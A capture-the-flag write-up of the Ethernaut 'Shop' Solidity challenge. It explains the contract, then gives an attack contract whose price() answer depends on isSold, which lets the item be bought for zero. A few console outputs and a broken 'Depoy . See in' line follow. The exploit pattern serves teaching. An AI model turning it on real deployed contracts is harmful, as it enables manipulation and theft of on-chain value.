<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

Challenge's message:

> Сan you get the item from the shop for less than the price asked?

This is a simple Solidity smart contract representing a shop where items can be bought. In this contract, we have **price** and **isSold** variables. The price is a public variable that holds the price of the item in the shop, initialized to 100. Then, the isSold variable is a boolean type that checks if the item has been sold or not.

- `Buyer` : This interface represents a buyer of the shop. It contains a function `price()` that when implemented, should return the price the buyer is willing to pay for the item.

- `buy()` : This function allows a buyer to buy an item from the shop. The function first creates an instance of the Buyer interface with the address of the person who called this function. It then checks if the price the buyer is willing to pay is greater than or equal to the price of the item and if the item has not been sold yet. If both conditions are met, the item is marked as sold and the price of the item is updated to the price the buyer paid.


This contract is a simple demonstration of how a shop might function on the blockchain. It should be noted that this contract does not actually transfer any ether or tokens, it simply changes the state variables based on the logic in the `buy()` function.


# Subverting

In this part of the challenge, the only thing we must do is reduce the price of the item. For this reason, we should change the returns value of the `price()` function in the Buyer interface to override the `price()` function. Remember that, the interface's functions can be overrideable. So, we will override the function that returns the value **based on the value of isSold with ternary operators**. I think we set the goals. Let's move on into attack contract.

```solidity
pragma solidity ^0.8.0;

import './Shop.sol';


contract Attack is Buyer{

    Shop target;

    constructor(address _target){
        target = Shop(_target);
    }

    function price() external override view returns (uint){
        return target.isSold() ? 0:100;
    }

    function attack()external{
        target.buy();
    }
}
```

Firstly, it gets an instance of the contract. And then, in the override `price()` function, if the isSold variable's value is equal to true, it returns 0. If it is not, it returns 100. Thus, we will pass the conditions call by call. Finally, call the `buy()` with the attack function. Get the item for free!

Depoy . See in 

```shell
await contract.price()
i {negative: 0, words: Array(2), length: 1, red: null}
length
: 
1
negative
: 
0
red
: 
null
words
: 
(2) [100, empty]
[[Prototype]]
: 
Object
```

```shell
await contract.isSold()
false
```

Ethernaut's message:

> Contracts can manipulate data seen by other contracts in any way they want. It's unsafe to change the state based on external and untrusted contracts logic.


